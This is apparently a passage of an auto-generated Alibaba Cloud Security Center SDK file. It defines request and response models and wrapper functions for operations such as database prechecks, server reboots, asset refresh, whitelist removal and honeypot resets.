model QueryJenkinsImageRegistryPersistenceDayResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: QueryJenkinsImageRegistryPersistenceDayResponseBody(name='body'),
}

/**
 * @summary Queries the retention period of images that are stored in a Jenkins image repository.
 *
 * @param request QueryJenkinsImageRegistryPersistenceDayRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return QueryJenkinsImageRegistryPersistenceDayResponse
 */
async function queryJenkinsImageRegistryPersistenceDayWithOptions(request: QueryJenkinsImageRegistryPersistenceDayRequest, runtime: Util.RuntimeOptions): QueryJenkinsImageRegistryPersistenceDayResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryJenkinsImageRegistryPersistenceDay',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the retention period of images that are stored in a Jenkins image repository.
 *
 * @param request QueryJenkinsImageRegistryPersistenceDayRequest
 * @return QueryJenkinsImageRegistryPersistenceDayResponse
 */
async function queryJenkinsImageRegistryPersistenceDay(request: QueryJenkinsImageRegistryPersistenceDayRequest): QueryJenkinsImageRegistryPersistenceDayResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryJenkinsImageRegistryPersistenceDayWithOptions(request, runtime);
}

model QueryPreCheckDatabaseRequest {
  instanceUuid?: string(name='InstanceUuid', description='The UUID of the agent that is used to back up the data of the database.

> You can call the [DescribeUniBackupDatabase](~~DescribeUniBackupDatabase~~) operation to query the UUID.', example='ebc895506c6911ed800000163e0e****'),
  taskId?: string(name='TaskId', description='The ID of the database precheck task.

> You can call the [StartPreCheckDatabase](~~StartPreCheckDatabase~~) operation to query the ID of the database precheck task.', example='t-000bc9nqwxsbyvod****'),
  uniRegionId?: string(name='UniRegionId', description='The region ID of the server that hosts the database.

This parameter is required.', example='cn-hangzhou'),
}

model QueryPreCheckDatabaseResponseBody = {
  completedTime?: long(name='CompletedTime', description='The time when the precheck task was complete.', example='1657524396'),
  createdTime?: long(name='CreatedTime', description='The time when the precheck task was started.', example='1660448660'),
  description?: string(name='Description', description='The status of the precheck task. Valid values:

*   **completed**: complete
*   **created**: started
*   **error**: failed', example='completed'),
  progress?: int32(name='Progress', description='The precheck progress in percentage. Valid values: 0 to 100.', example='100'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F****'),
  result?: string(name='Result', description='The result of the precheck task. The value is a JSON string that contains the following fields:

*   **instanceId**: the ID of the server that hosts the database

*   **checkTime**: the precheck time

*   **sourceType**: the database type

*   **results**: the precheck item and result

    *   **item**: the precheck item
    *   **result**: the precheck result

> The following section describes the precheck items:

*   MSSQL

    *   **OSS_INTERNAL_ENDPOINT_CONNECTIVITY**: OSS connectivity check
    *   **SERVICE_CONNECTIVITY**: control network connectivity check
    *   **SQL_SERVER_DB_IN_SIMPLE_RECOVERY_MODE**: recovery mode check
    *   **SQL_SERVER_DB_NOT_ONLINE**: SQL Server database status check

*   ORACLE

    *   **OSS_INTERNAL_ENDPOINT_CONNECTIVITY**: OSS connectivity check
    *   **SERVICE_CONNECTIVITY**: control network connectivity check
    *   **ORACLE_INSTANCE_STATUS**: Oracle instance status check
    *   **ORACLE_DB_STATUS**: Oracle database status check
    *   **ARCHIVELOG**: archive mode check

*   MYSQL

    *   **OSS_INTERNAL_ENDPOINT_CONNECTIVITY**: OSS connectivity check
    *   **SERVICE_CONNECTIVITY**: control network connectivity check
    *   **MYSQL_VERSION**: Supports full backup version checking
    *   **MYSQL_BINLOG**: BINLOG check', example='[
    {
        "instanceId": "i-wz91if83t97xgtn2****",
        "checkTime": 1671245753,
        "sourceType": "MSSQL",
        "results":
        [
            {
                "item": "OSS_INTERNAL_ENDPOINT_CONNECTIVITY",
                "result": "PASSED"
            },
            {
                "item": "SERVICE_CONNECTIVITY",
                "result": "PASSED"
            },
            {
                "item": "SQL_SERVER_DB_IN_SIMPLE_RECOVERY_MODE",
                "result": "WARNING"
            },
            {
                "item": "SQL_SERVER_DB_NOT_ONLINE",
                "result": "PASSED"
            }
        ]
    }
]'),
  updatedTime?: long(name='UpdatedTime', description='The time when the precheck task was last updated.', example='1671084106'),
}

model QueryPreCheckDatabaseResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: QueryPreCheckDatabaseResponseBody(name='body'),
}

/**
 * @summary Queries the result of a database precheck task.
 *
 * @param request QueryPreCheckDatabaseRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return QueryPreCheckDatabaseResponse
 */
async function queryPreCheckDatabaseWithOptions(request: QueryPreCheckDatabaseRequest, runtime: Util.RuntimeOptions): QueryPreCheckDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceUuid)) {
    query['InstanceUuid'] = request.instanceUuid;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryPreCheckDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the result of a database precheck task.
 *
 * @param request QueryPreCheckDatabaseRequest
 * @return QueryPreCheckDatabaseResponse
 */
async function queryPreCheckDatabase(request: QueryPreCheckDatabaseRequest): QueryPreCheckDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryPreCheckDatabaseWithOptions(request, runtime);
}

model RebootMachineRequest {
  uuid?: string(name='Uuid', description='The UUID of the server that you want to restart.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='7151f27e-1d51-4e98-a540-8936a****'),
}

model RebootMachineResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='151F6EB6-D5F3-417A-AF7B-4D84975DB586'),
}

model RebootMachineResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: RebootMachineResponseBody(name='body'),
}

/**
 * @summary Restarts a server. Only Windows servers are supported.
 *
 * @param request RebootMachineRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return RebootMachineResponse
 */
async function rebootMachineWithOptions(request: RebootMachineRequest, runtime: Util.RuntimeOptions): RebootMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RebootMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Restarts a server. Only Windows servers are supported.
 *
 * @param request RebootMachineRequest
 * @return RebootMachineResponse
 */
async function rebootMachine(request: RebootMachineRequest): RebootMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return rebootMachineWithOptions(request, runtime);
}

model ReceiveFunctionTrialRewardByAliUidRequest {
  functionName?: string(name='FunctionName', description='The name of the feature for which you want to apply for a free trial. Valid values:

*   **trail_honeypot_reward**: cloud honeypot
*   **trail_file_detect_api_reward**: SDK for malicious file detection', example='trail_honeypot_reward'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model ReceiveFunctionTrialRewardByAliUidResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='94004FDB-27EC-5666-83D4-D0C5C624****'),
}

model ReceiveFunctionTrialRewardByAliUidResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ReceiveFunctionTrialRewardByAliUidResponseBody(name='body'),
}

/**
 * @summary Receives a reward that allows you to enable a free trial of the cloud honeypot feature or the feature of SDK for malicious file detection. You can receive a reward after you complete the required task.
 *
 * @param request ReceiveFunctionTrialRewardByAliUidRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ReceiveFunctionTrialRewardByAliUidResponse
 */
async function receiveFunctionTrialRewardByAliUidWithOptions(request: ReceiveFunctionTrialRewardByAliUidRequest, runtime: Util.RuntimeOptions): ReceiveFunctionTrialRewardByAliUidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.functionName)) {
    query['FunctionName'] = request.functionName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ReceiveFunctionTrialRewardByAliUid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Receives a reward that allows you to enable a free trial of the cloud honeypot feature or the feature of SDK for malicious file detection. You can receive a reward after you complete the required task.
 *
 * @param request ReceiveFunctionTrialRewardByAliUidRequest
 * @return ReceiveFunctionTrialRewardByAliUidResponse
 */
async function receiveFunctionTrialRewardByAliUid(request: ReceiveFunctionTrialRewardByAliUidRequest): ReceiveFunctionTrialRewardByAliUidResponse {
  var runtime = new Util.RuntimeOptions{};
  return receiveFunctionTrialRewardByAliUidWithOptions(request, runtime);
}

model RefreshAssetsRequest {
  assetType?: string(name='AssetType', description='The type of the asset that you want to synchronize. Valid values:

*   **cloud_product**: Alibaba Cloud service
*   **ecs**: Elastic Compute Service (ECS) instance
*   **container_image**: container image', example='cloud_product'),
  cloudAssetSubType?: int32(name='CloudAssetSubType', description='The subtype of the cloud service.

>  The following list describes the subtypes of cloud services.', example='0'),
  cloudAssetType?: int32(name='CloudAssetType', description='The type of the cloud service. Valid values:

*   **0**: ECS
*   **1**: Server Load Balancer (SLB)
*   **3**: ApsaraDB RDS
*   **4**: ApsaraDB for MongoDB (MongoDB)
*   **5**: ApsaraDB for Redis (Redis)
*   **6**: Container Registry
*   **8**: Container Service for Kubernetes (ACK)
*   **9**: Virtual Private Cloud (VPC)
*   **11**: ActionTrail
*   **12**: Alibaba Cloud CDN (CDN)
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
*   **14**: Apsara Devops
*   **15**: Resource Access Management (RAM)
*   **16**: Anti-DDoS
*   **17**: Web Application Firewall (WAF)
*   **18**: Object Storage Service (OSS)
*   **19**: PolarDB
*   **20**: ApsaraDB RDS for PostgreSQL
*   **21**: Microservices Engine (MSE)
*   **22**: File Storage NAS (NAS)
*   **23**: Data Security Center (DSC)
*   **24**: Elastic IP Address (EIP)', example='0'),
  vendor?: int32(name='Vendor', description='The type of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: a third-party cloud asset
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: an asset provided by another cloud
*   **8**: a lightweight asset', example='0'),
}

model RefreshAssetsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='340D7FC4-D575-1661-8ACD-CFA7BE57B795'),
}

model RefreshAssetsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: RefreshAssetsResponseBody(name='body'),
}

/**
 * @summary Synchronizes assets.
 *
 * @param request RefreshAssetsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return RefreshAssetsResponse
 */
async function refreshAssetsWithOptions(request: RefreshAssetsRequest, runtime: Util.RuntimeOptions): RefreshAssetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.cloudAssetSubType)) {
    query['CloudAssetSubType'] = request.cloudAssetSubType;
  }
  if (!Util.isUnset(request.cloudAssetType)) {
    query['CloudAssetType'] = request.cloudAssetType;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RefreshAssets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Synchronizes assets.
 *
 * @param request RefreshAssetsRequest
 * @return RefreshAssetsResponse
 */
async function refreshAssets(request: RefreshAssetsRequest): RefreshAssetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return refreshAssetsWithOptions(request, runtime);
}

model RefreshContainerAssetsRequest {
  assetType?: string(name='AssetType', description='The type of the container asset whose statistics you want to refresh. Valid values:

*   **IMAGE**
*   **CONTAINER**

This parameter is required.', example='IMAGE'),
}

model RefreshContainerAssetsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2090F329-3658-49AF-820B-C4157FC31BCB'),
}

model RefreshContainerAssetsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: RefreshContainerAssetsResponseBody(name='body'),
}

/**
 * @summary Refreshes the statistics of container assets in the Assets module.
 *
 * @param request RefreshContainerAssetsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return RefreshContainerAssetsResponse
 */
async function refreshContainerAssetsWithOptions(request: RefreshContainerAssetsRequest, runtime: Util.RuntimeOptions): RefreshContainerAssetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RefreshContainerAssets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Refreshes the statistics of container assets in the Assets module.
 *
 * @param request RefreshContainerAssetsRequest
 * @return RefreshContainerAssetsResponse
 */
async function refreshContainerAssets(request: RefreshContainerAssetsRequest): RefreshContainerAssetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return refreshContainerAssetsWithOptions(request, runtime);
}

model RefreshOssBucketScanInfoResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='CE290C1F-4B7D-5024-9D2F-E26D7B08****'),
}

model RefreshOssBucketScanInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: RefreshOssBucketScanInfoResponseBody(name='body'),
}

/**
 * @summary Refreshes the list of Object Storage Service (OSS) buckets.
 *
 * @param request RefreshOssBucketScanInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return RefreshOssBucketScanInfoResponse
 */
async function refreshOssBucketScanInfoWithOptions(runtime: Util.RuntimeOptions): RefreshOssBucketScanInfoResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'RefreshOssBucketScanInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Refreshes the list of Object Storage Service (OSS) buckets.
 *
 * @return RefreshOssBucketScanInfoResponse
 */
async function refreshOssBucketScanInfo(): RefreshOssBucketScanInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return refreshOssBucketScanInfoWithOptions(runtime);
}

model RefreshRegistryTokenRequest {
  registryId?: long(name='RegistryId', description='The ID of the image repository.

>  You can call the [PageImageRegistry](~~PageImageRegistry~~) operation to obtain the ID.

This parameter is required.', example='1'),
}

model RefreshRegistryTokenResponseBody = {
  data?: string(name='Data', description='The returned token.', example='77ba3bf5-af95-4b77-aa94-***********'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

model RefreshRegistryTokenResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: RefreshRegistryTokenResponseBody(name='body'),
}

/**
 * @summary Updates an image token.
 *
 * @param request RefreshRegistryTokenRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return RefreshRegistryTokenResponse
 */
async function refreshRegistryTokenWithOptions(request: RefreshRegistryTokenRequest, runtime: Util.RuntimeOptions): RefreshRegistryTokenResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.registryId)) {
    query['RegistryId'] = request.registryId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RefreshRegistryToken',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Updates an image token.
 *
 * @param request RefreshRegistryTokenRequest
 * @return RefreshRegistryTokenResponse
 */
async function refreshRegistryToken(request: RefreshRegistryTokenRequest): RefreshRegistryTokenResponse {
  var runtime = new Util.RuntimeOptions{};
  return refreshRegistryTokenWithOptions(request, runtime);
}

model ReleaseSasInstanceRequest {
  chargeType?: string(name='ChargeType'),
  instanceId?: string(name='InstanceId'),
}

model ReleaseSasInstanceResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model ReleaseSasInstanceResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ReleaseSasInstanceResponseBody(name='body'),
}

/**
 * @summary 释放云安全中心实例
 *
 * @param request ReleaseSasInstanceRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ReleaseSasInstanceResponse
 */
async function releaseSasInstanceWithOptions(request: ReleaseSasInstanceRequest, runtime: Util.RuntimeOptions): ReleaseSasInstanceResponse {
  Util.validateModel(request);
  var body : map[string]any = {};
  if (!Util.isUnset(request.chargeType)) {
    body['ChargeType'] = request.chargeType;
  }
  if (!Util.isUnset(request.instanceId)) {
    body['InstanceId'] = request.instanceId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'ReleaseSasInstance',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary 释放云安全中心实例
 *
 * @param request ReleaseSasInstanceRequest
 * @return ReleaseSasInstanceResponse
 */
async function releaseSasInstance(request: ReleaseSasInstanceRequest): ReleaseSasInstanceResponse {
  var runtime = new Util.RuntimeOptions{};
  return releaseSasInstanceWithOptions(request, runtime);
}

model RemoveCheckInstanceResultWhiteListRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.', example='11'),
  instanceIds?: [ string ](name='InstanceIds', description='The IDs of instances. Separate multiple IDs with commas (,).'),
}

model RemoveCheckInstanceResultWhiteListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F156EA41-8EEF-54B2-908B-EAE071XXXXXX'),
}

model RemoveCheckInstanceResultWhiteListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: RemoveCheckInstanceResultWhiteListResponseBody(name='body'),
}

/**
 * @summary Removes an instance from the whitelist.
 *
 * @param request RemoveCheckInstanceResultWhiteListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return RemoveCheckInstanceResultWhiteListResponse
 */
async function removeCheckInstanceResultWhiteListWithOptions(request: RemoveCheckInstanceResultWhiteListRequest, runtime: Util.RuntimeOptions): RemoveCheckInstanceResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RemoveCheckInstanceResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Removes an instance from the whitelist.
 *
 * @param request RemoveCheckInstanceResultWhiteListRequest
 * @return RemoveCheckInstanceResultWhiteListResponse
 */
async function removeCheckInstanceResultWhiteList(request: RemoveCheckInstanceResultWhiteListRequest): RemoveCheckInstanceResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return removeCheckInstanceResultWhiteListWithOptions(request, runtime);
}

model RemoveCheckResultWhiteListRequest {
  checkGroupId?: string(name='CheckGroupId', description='This parameter is deprecated.', example='Deprecated'),
  checkIds?: [ long ](name='CheckIds', description='The IDs of the check items.'),
  ruleId?: long(name='RuleId', description='The ID of the whitelist rule.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to query the IDs of whitelist rules.', example='22'),
  type?: string(name='Type', description='This parameter is deprecated.', example='Deprecated'),
}

model RemoveCheckResultWhiteListResponseBody = {
  code?: string(name='Code', description='The HTTP status code. The status code 200 indicates that the request was successful.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='98C82076-E0D5-51DA-99F2-513F4XXXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model RemoveCheckResultWhiteListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: RemoveCheckResultWhiteListResponseBody(name='body'),
}

/**
 * @summary Removes the check items of the configuration assessment feature from the whitelist.
 *
 * @param request RemoveCheckResultWhiteListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return RemoveCheckResultWhiteListResponse
 */
async function removeCheckResultWhiteListWithOptions(request: RemoveCheckResultWhiteListRequest, runtime: Util.RuntimeOptions): RemoveCheckResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkGroupId)) {
    query['CheckGroupId'] = request.checkGroupId;
  }
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RemoveCheckResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Removes the check items of the configuration assessment feature from the whitelist.
 *
 * @param request RemoveCheckResultWhiteListRequest
 * @return RemoveCheckResultWhiteListResponse
 */
async function removeCheckResultWhiteList(request: RemoveCheckResultWhiteListRequest): RemoveCheckResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return removeCheckResultWhiteListWithOptions(request, runtime);
}

model ResetHoneypotRequest {
  honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.

>  You can call the [ListHoneypot](~~ListHoneypot~~) operation to query the IDs of honeypots.

This parameter is required.', example='945607c2ae2a1a737c04599d6608065688bfc6048d9b9d306ce8dc8191c*****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model ResetHoneypotResponseBody = {
  data?: {
    controlNodeName?: string(name='ControlNodeName', description='The name of the management node to which the honeypot belongs.', example='managerNodename'),
    honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='9bf8cd373112263d4bc102fc5dba9d9f812ee05d4d35c487d330d52e937f****'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the image.', example='RuoYi'),
    honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.', example='ruoyi'),
    honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.', example='ruoyi'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetId?: string(name='PresetId', description='The ID of the custom configuration for the honeypot.', example='868a7579-00b5-4a74-999d-8bd3f411****'),
    state?: [ string ](name='State', description='The statuses of the honeypots.'),
  }(name='Data', description='The information about the honeypot.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A57C711B-AA15-55B2-8F61-4D09CEXXXXX'),
}

model ResetHoneypotResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ResetHoneypotResponseBody(name='body'),
}

/**
 * @summary Resets a honeypot.
 *
 * @param request ResetHoneypotRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ResetHoneypotResponse
 */
async function resetHoneypotWithOptions(request: ResetHoneypotRequest, runtime: Util.RuntimeOptions): ResetHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotId)) {
    query['HoneypotId'] = request.honeypotId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ResetHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Resets a honeypot.
 *
 * @param request ResetHoneypotRequest
 * @return ResetHoneypotResponse
 */
async function resetHoneypot(request: ResetHoneypotRequest): ResetHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return resetHoneypotWithOptions(request, runtime);
}

model ResetLogShipperRequest {
  hotTtl?: int32(name='HotTtl', description='The global retention period of hot data.

>  The value of this parameter must be at least 7 and smaller than the log retention period. Unit: days.', example='7'),
  logMetaList?: [ 
    {
      configLogStore?: string(name='ConfigLogStore', description='The Logstore that you want to configure.

>  You can call the [DescribeLogMeta](~~DescribeLogMeta~~) operation to query the Logstore.', example='sas-security-log'),
      hotTtl?: int32(name='HotTtl', description='The retention period of hot data in the Logstore.

>  The value of this parameter must be at least 7 and smaller than the log retention period. Unit: days. If you specify this parameter for the Logstore, the global retention period of hot data specified by the HotTtl parameter is overwritten.', example='7'),
      status?: string(name='Status', description='The status of the log analysis feature. Valid values:

*   **disabled**
*   **enabled**', example='enabled'),
      ttl?: int32(name='Ttl', description='The log retention period of the Logstore.

>  If you specify this parameter for the Logstore, the global log retention period specified by the Ttl parameter is overwritten.', example='60'),
    }
  ](name='LogMetaList', description='The settings of the log analysis feature.'),
  ttl?: int32(name='Ttl', description='The global log retention period.

>  This parameter is supported only when the log analysis feature uses the pay-as-you-go billing method.', example='180'),
}

model ResetLogShipperResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='D2E31293-DAAC-574B-B816-A18EA0A6****'),
}

model ResetLogShipperResponse = {
